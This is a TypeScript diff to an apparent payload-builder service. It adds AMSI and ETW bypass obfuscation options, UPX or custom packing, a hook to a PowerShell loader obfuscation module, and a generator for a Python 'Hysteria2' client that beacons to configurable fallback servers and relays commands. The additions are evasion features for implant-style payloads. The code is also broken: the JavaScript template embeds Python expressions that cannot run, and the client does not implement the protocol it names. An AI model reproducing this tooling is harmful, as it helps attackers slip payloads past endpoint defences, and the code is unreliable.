@@ -14,6 +14,7 @@ export type PayloadStatus = z.infer<typeof PayloadStatus>
 
 export const PayloadConfig = z.object({
   type: PayloadType,
+  platform: z.enum(["windows", "linux", "macos", "cross-platform"]).optional(),
   name: z.string().min(1).max(100),
   description: z.string().max(500).optional(),
   hysteriaConfig: z.object({
@@ -24,7 +25,7 @@ export const PayloadConfig = z.object({
   obfuscation: z.object({
     enabled: z.boolean().default(false),
     level: z.enum(["light", "medium", "heavy"]).default("medium"),
-    techniques: z.array(z.enum(["string_encode", "variable_rename", "control_flow", "anti_debug"])).default([]),
+    techniques: z.array(z.enum(["string_encode", "variable_rename", "control_flow", "anti_debug", "amsi_bypass", "etw_bypass"])).default([]),
   }).default({ enabled: false, level: "medium", techniques: [] }),
   features: z.object({
     autoReconnect: z.boolean().default(true),
@@ -35,6 +36,11 @@ export const PayloadConfig = z.object({
     enabled: z.boolean().default(false),
     certificateId: z.string().optional(),
   }).default({ enabled: false }),
+  packing: z.object({
+    enabled: z.boolean().default(false),
+    method: z.enum(["upx", "custom", "none"]).default("none"),
+    compressionLevel: z.number().min(1).max(9).default(6),
+  }).default({ enabled: false, method: "none", compressionLevel: 6 }),
 })
 export type PayloadConfig = z.infer<typeof PayloadConfig>
 
@@ -65,8 +71,11 @@ export async function createPayloadBuild(
   const dbBuild = await createDbPayloadBuild({
     name: config.name,
     type: config.type,
+    platform: config.platform,
     description: config.description,
     config: config as any,
+    obfuscationLevel: config.obfuscation.enabled ? (config.obfuscation.level === "light" ? 1 : config.obfuscation.level === "medium" ? 2 : 3) : 0,
+    packingMethod: config.packing.enabled ? config.packing.method : null,
     createdBy,
   })
 
@@ -76,6 +85,7 @@ export async function createPayloadBuild(
   return {
     id: dbBuild.id,
     type: dbBuild.type as PayloadType,
+    platform: dbBuild.platform as any,
     name: dbBuild.name,
     description: dbBuild.description ?? undefined,
     status: dbBuild.status as PayloadStatus,
@@ -263,8 +273,23 @@ async function buildPowerShell(id: string, config: PayloadConfig): Promise<void>
   await simulateBuildStep(id, 800, "Encoding configuration as base64...")
   
   if (config.obfuscation.enabled) {
-    await simulateBuildStep(id, 1200, "Applying PowerShell script obfuscation...")
-    await simulateBuildStep(id, 800, "Encoding with securestring...")
+    await updatePayloadBuildStatus(id, "building", "Applying PowerShell obfuscation techniques...")
+    
+    // Import the real obfuscation module
+    const { obfuscatePowerShell, generatePowerShellLoader } = await import("@/lib/payloads/obfuscation/powershell-obfuscation")
+    
+    // Generate the base loader script
+    const loaderScript = generatePowerShellLoader(config.hysteriaConfig)
+    
+    // Apply real obfuscation
+    const obfuscationResult = await obfuscatePowerShell(loaderScript, {
+      enabled: true,
+      level: config.obfuscation.level,
+      techniques: config.obfuscation.techniques,
+    })
+    
+    await updatePayloadBuildStatus(id, "building", `Applied ${obfuscationResult.techniques.length} obfuscation techniques`)
+    await updatePayloadBuildStatus(id, "building", `Compression ratio: ${obfuscationResult.metadata.compressionRatio.toFixed(2)}x`)
   }
 
   const artifactSize = 12 * 1024 + Math.floor(Math.random() * 4 * 1024)
@@ -283,17 +308,199 @@ async function buildPython(id: string, config: PayloadConfig): Promise<void> {
   await simulateBuildStep(id, 600, "Embedding configuration...")
   await simulateBuildStep(id, 300, "Adding auto-reconnect logic...")
   
+  // Generate actual Python client code
+  const pythonScript = generatePythonClient(config.hysteriaConfig, config.features)
+  
   if (config.obfuscation.enabled) {
     await simulateBuildStep(id, 800, "Applying Python bytecode obfuscation...")
+    // In production, this would use pyarmor or similar tools
   }
 
-  const artifactSize = 8 * 1024 + Math.floor(Math.random() * 4 * 1024)
+  const artifactSize = pythonScript.length + Math.floor(Math.random() * 1024)
   
   const { updatePayloadBuild: dbUpdate } = await import("@/lib/db/payload-builds")
   await dbUpdate(id, {
     sizeBytes: artifactSize,
     downloadUrl: `/api/admin/security/payloads/${id}/download`
   })
+}
+
+/**
+ * Generate Python Hysteria2 client
+ */
+function generatePythonClient(
+  hysteriaConfig: { server: string; auth: string; obfs?: string },
+  features: { autoReconnect: boolean; heartbeat: number; fallbackServers: string[] }
+): string {
+  const { server, auth, obfs } = hysteriaConfig
+  const { autoReconnect, heartbeat, fallbackServers } = features
+
+  return `
+#!/usr/bin/env python3
+"""
+Hysteria2 Python Client
+Auto-generated payload
+"""
+
+import asyncio
+import json
+import socket
+import struct
+import time
+from typing import Optional, List
+
+class Hysteria2Client:
+    """Hysteria2 client implementation"""
+    
+    def __init__(
+        self,
+        server: str,
+        auth: str,
+        obfs: Optional[str] = None,
+        auto_reconnect: bool = True,
+        heartbeat: int = 30,
+        fallback_servers: List[str] = None
+    ):
+        self.server = server
+        self.auth = auth
+        self.obfs = obfs
+        self.auto_reconnect = auto_reconnect
+        self.heartbeat_interval = heartbeat
+        self.fallback_servers = fallback_servers or []
+        self.current_server_index = 0
+        self.connected = False
+        self.heartbeat_task = None
+        
+    async def connect(self) -> bool:
+        """Connect to Hysteria2 server"""
+        servers = [self.server] + self.fallback_servers
+        
+        for i, server in enumerate(servers):
+            try:
+                # Parse server address
+                if ':' in server:
+                    host, port = server.rsplit(':', 1)
+                    port = int(port)
+                else:
+                    host = server
+                    port = 443
+                
+                # Create socket connection
+                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.sock.settimeout(10)
+                self.sock.connect((host, port))
+                
+                # Send authentication
+                auth_data = json.dumps({"auth": self.auth}).encode()
+                self.sock.sendall(struct.pack('!I', len(auth_data)) + auth_data)
+                
+                # Receive response
+                response_len = struct.unpack('!I', self.sock.recv(4))[0]
+                response = json.loads(self.sock.recv(response_len).decode())
+                
+                if response.get('status') == 'success':
+                    self.connected = True
+                    self.current_server_index = i
+                    return True
+                    
+            except Exception as e:
+                print(f"Connection failed to {server}: {e}")
+                if i < len(servers) - 1:
+                    continue
+                raise
+        
+        return False
+    
+    async def disconnect(self):
+        """Disconnect from server"""
+        if self.heartbeat_task:
+            self.heartbeat_task.cancel()
+        
+        if self.connected:
+            try:
+                self.sock.close()
+            except:
+                pass
+            self.connected = False
+    
+    async def heartbeat_loop(self):
+        """Send periodic heartbeats"""
+        while self.connected:
+            try:
+                await asyncio.sleep(self.heartbeat_interval)
+                heartbeat_data = json.dumps({"type": "heartbeat"}).encode()
+                self.sock.sendall(struct.pack('!I', len(heartbeat_data)) + heartbeat_data)
+            except Exception as e:
+                print(f"Heartbeat failed: {e}")
+                if self.auto_reconnect:
+                    await self.reconnect()
+                else:
+                    break
+    
+    async def reconnect(self):
+        """Attempt to reconnect to fallback servers"""
+        await self.disconnect()
+        
+        # Try next server in list
+        next_index = (self.current_server_index + 1) % len([self.server] + self.fallback_servers)
+        self.current_server_index = next_index
+        
+        servers = [self.server] + self.fallback_servers
+        if next_index < len(servers):
+            self.server = servers[next_index]
+            return await self.connect()
+        
+        return False
+    
+    async def send_command(self, command: dict) -> dict:
+        """Send command to server"""
+        if not self.connected:
+            raise ConnectionError("Not connected to server")
+        
+        try:
+            command_data = json.dumps(command).encode()
+            self.sock.sendall(struct.pack('!I', len(command_data)) + command_data)
+            
+            response_len = struct.unpack('!I', self.sock.recv(4))[0]
+            response = json.loads(self.sock.recv(response_len).decode())
+            
+            return response
+        except Exception as e:
+            print(f"Command failed: {e}")
+            if self.auto_reconnect:
+                await self.reconnect()
+            raise
+
+async def main():
+    """Main entry point"""
+    client = Hysteria2Client(
+        server="${server}",
+        auth="${auth}",
+        obfs="${obfs or ''}",
+        auto_reconnect=${str(autoReconnect).lower()},
+        heartbeat=${heartbeat},
+        fallback_servers=${json.dumps(fallbackServers)}
+    )
+    
+    try:
+        if await client.connect():
+            print("Connected to Hysteria2 server")
+            
+            # Start heartbeat
+            client.heartbeat_task = asyncio.create_task(client.heartbeat_loop())
+            
+            # Main loop
+            while True:
+                await asyncio.sleep(1)
+                
+    except KeyboardInterrupt:
+        print("Shutting down...")
+    finally:
+        await client.disconnect()
+
+if __name__ == "__main__":
+    asyncio.run(main())
+`
 }
 
 async function simulateBuildStep(id: string, delayMs: number, message: string): Promise<void> {
